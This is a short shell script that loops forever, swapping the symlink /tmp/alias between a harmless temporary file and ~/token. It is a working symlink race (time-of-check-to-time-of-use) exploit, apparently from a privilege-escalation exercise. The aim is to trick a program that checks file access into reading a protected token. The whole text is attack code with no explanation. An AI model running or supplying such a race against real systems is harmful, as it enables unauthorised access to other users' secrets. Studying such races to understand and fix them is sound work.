touch /tmp/tmpfile
while true;
do
    ln -sf /tmp/tmpfile /tmp/alias
    ln -sf ~/token /tmp/alias
done
